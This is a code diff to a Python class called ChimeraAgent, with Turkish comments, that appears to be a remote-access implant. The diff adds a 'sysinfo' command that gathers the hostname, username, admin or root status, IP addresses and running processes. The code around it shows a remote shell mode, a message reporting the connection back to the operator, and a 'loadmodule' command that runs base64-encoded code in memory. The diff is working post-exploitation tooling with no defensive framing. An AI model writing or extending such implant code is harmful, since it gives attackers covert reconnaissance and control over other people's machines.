@@ -210,6 +210,178 @@ class ChimeraAgent:
         except Exception:
             self.send_data("Chimera Agent Connected")
 
+    def get_detailed_sysinfo(self) -> str:
+        """Detaylı sistem bilgisi toplar ve formatlanmış string olarak döner.
+        
+        Returns:
+            str: Formatlanmış sistem bilgileri
+        """
+        output = []
+        output.append("=" * 60)
+        output.append("DETAYLI SİSTEM BİLGİSİ")
+        output.append("=" * 60)
+        
+        try:
+            # 1. Temel Sistem Bilgileri
+            uname = platform.uname()
+            output.append("\n[+] İşletim Sistemi:")
+            output.append(f"    Sistem       : {uname.system}")
+            output.append(f"    Sürüm        : {uname.release}")
+            output.append(f"    Platform     : {uname.version}")
+            output.append(f"    Mimari       : {uname.machine}")
+            output.append(f"    Hostname     : {uname.node}")
+            
+            # 2. Kullanıcı Bilgileri
+            try:
+                username = os.getlogin()
+            except Exception:
+                username = os.environ.get("USER", os.environ.get("USERNAME", "unknown"))
+            
+            output.append("\n[+] Kullanıcı Bilgileri:")
+            output.append(f"    Kullanıcı    : {username}")
+            output.append(f"    Python       : {platform.python_version()}")
+            output.append(f"    PID          : {os.getpid()}")
+            output.append(f"    Çalışma Dizini: {os.getcwd()}")
+            
+            # 3. Yetki Seviyesi
+            output.append("\n[+] Yetki Seviyesi:")
+            if sys.platform == "win32":
+                try:
+                    import ctypes
+                    is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+                    output.append(f"    Administrator: {'Evet' if is_admin else 'Hayır'}")
+                except Exception:
+                    output.append(f"    Administrator: Tespit Edilemedi")
+            else:
+                # Unix/Linux sistemler
+                is_root = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
+                output.append(f"    Root/Sudo    : {'Evet' if is_root else 'Hayır'}")
+                try:
+                    output.append(f"    UID          : {os.getuid()}")
+                    output.append(f"    GID          : {os.getgid()}")
+                except Exception:
+                    pass
+            
+            # 4. IP Adresleri
+            output.append("\n[+] Ağ Bilgileri (IP Adresleri):")
+            ip_list = self._get_ip_addresses()
+            if ip_list:
+                for ip_info in ip_list:
+                    output.append(f"    {ip_info}")
+            else:
+                output.append("    IP adresi bulunamadı")
+            
+            # 5. Çalışan Process Listesi (İlk 30 process)
+            output.append("\n[+] Çalışan Process'ler (İlk 30):")
+            processes = self._get_running_processes()
+            if processes:
+                output.append(f"    {'PID':<8} {'İsim':<30}")
+                output.append(f"    {'-'*8} {'-'*30}")
+                for proc in processes[:30]:
+                    output.append(f"    {proc}")
+            else:
+                output.append("    Process listesi alınamadı")
+            
+        except Exception as e:
+            output.append(f"\n[!] Hata: {str(e)}")
+        
+        output.append("\n" + "=" * 60)
+        return "\n".join(output)
+    
+    def _get_ip_addresses(self) -> list:
+        """Sistemdeki tüm IP adreslerini toplar.
+        
+        Returns:
+            list: IP adresi bilgileri
+        """
+        ip_list = []
+        try:
+            if sys.platform == "win32":
+                # Windows için ipconfig çıktısı parse et
+                result = subprocess.check_output("ipconfig", shell=True, stderr=subprocess.DEVNULL)
+                output = result.decode('cp1254', errors='ignore')
+                
+                import re
+                ipv4_pattern = r"IPv4.*?: ([\d\.]+)"
+                ipv6_pattern = r"IPv6.*?: ([a-fA-F0-9:]+)"
+                
+                ipv4_matches = re.findall(ipv4_pattern, output)
+                ipv6_matches = re.findall(ipv6_pattern, output)
+                
+                for ip in ipv4_matches:
+                    ip_list.append(f"IPv4: {ip}")
+                for ip in ipv6_matches:
+                    ip_list.append(f"IPv6: {ip}")
+            else:
+                # Linux/MacOS için ifconfig veya ip addr
+                try:
+                    result = subprocess.check_output("ip addr show", shell=True, stderr=subprocess.DEVNULL)
+                    output = result.decode('utf-8')
+                except Exception:
+                    try:
+                        result = subprocess.check_output("ifconfig", shell=True, stderr=subprocess.DEVNULL)
+                        output = result.decode('utf-8')
+                    except Exception:
+                        return ip_list
+                
+                import re
+                ipv4_pattern = r"inet (?:addr:)?([\d\.]+)"
+                ipv6_pattern = r"inet6 (?:addr:)?([a-fA-F0-9:]+)"
+                
+                ipv4_matches = re.findall(ipv4_pattern, output)
+                ipv6_matches = re.findall(ipv6_pattern, output)
+                
+                for ip in ipv4_matches:
+                    if ip != "127.0.0.1":  # Loopback'i atla
+                        ip_list.append(f"IPv4: {ip}")
+                for ip in ipv6_matches:
+                    if not ip.startswith("::1"):  # Loopback'i atla
+                        ip_list.append(f"IPv6: {ip}")
+        except Exception:
+            pass
+        
+        return ip_list if ip_list else ["IP adresi tespit edilemedi"]
+    
+    def _get_running_processes(self) -> list:
+        """Çalışan process listesini toplar.
+        
+        Returns:
+            list: Process bilgileri (PID ve isim)
+        """
+        processes = []
+        try:
+            if sys.platform == "win32":
+                # Windows için tasklist
+                result = subprocess.check_output("tasklist", shell=True, stderr=subprocess.DEVNULL)
+                output = result.decode('cp1254', errors='ignore')
+                
+                lines = output.split('\n')[3:]  # Header'ı atla
+                for line in lines:
+                    if line.strip():
+                        parts = line.split()
+                        if len(parts) >= 2:
+                            name = parts[0]
+                            pid = parts[1]
+                            processes.append(f"{pid:<8} {name:<30}")
+            else:
+                # Linux/MacOS için ps
+                result = subprocess.check_output("ps aux", shell=True, stderr=subprocess.DEVNULL)
+                output = result.decode('utf-8', errors='ignore')
+                
+                lines = output.split('\n')[1:]  # Header'ı atla
+                for line in lines:
+                    if line.strip():
+                        parts = line.split()
+                        if len(parts) >= 11:
+                            pid = parts[1]
+                            # Komut adını al (son kısım)
+                            name = parts[10]
+                            processes.append(f"{pid:<8} {name:<30}")
+        except Exception:
+            pass
+        
+        return processes
+
     # --------------------------------------------------------
     # Komut Çalıştırma
     # --------------------------------------------------------
@@ -316,12 +488,16 @@ class ChimeraAgent:
         if cmd_lower == "terminate":
             self.running = False
             return "Agent sonlandırılıyor..."
+        
+        # Sistem bilgisi komutu
+        if cmd_lower == "sysinfo":
+            return self.get_detailed_sysinfo()
             
         # Özel komutlar - Shell
         if cmd_lower == "shell":
             return self.shell_mode()
         
-        # Özel komutlar - Modül Yönetimi (Faz 2.1)
+        # Modül Yönetimi - Hafızadan modül yükleme ve çalıştırma
         if cmd_lower.startswith("loadmodule "):
             try:
                 # Format: loadmodule <name> <b64_code>
